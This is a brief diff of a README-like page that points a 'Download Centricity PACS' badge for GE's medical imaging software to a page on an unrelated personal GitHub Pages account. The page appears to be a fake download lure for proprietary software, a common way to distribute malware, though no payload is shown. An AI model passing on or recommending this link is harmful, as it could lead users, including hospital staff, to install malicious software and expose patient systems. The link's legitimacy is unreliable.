@@ -2,8 +2,7 @@
 
 ## 📥GE Centricity PACS
 
-[![⬇️Centricity PACS](https://img.shields.io/badge/Download-Centricity%20PACS-blue?style=for-the-badge&logo=windows)](https://ge-healthcare-centricity-pacs.github.io/.github
-)
+[![⬇️Centricity PACS](https://img.shields.io/badge/Download-Centricity%20PACS-blue?style=for-the-badge&logo=windows)](https://sizowameelena.github.io/.github/ge-healthcare-centricity-pacs)
 
 ---
 
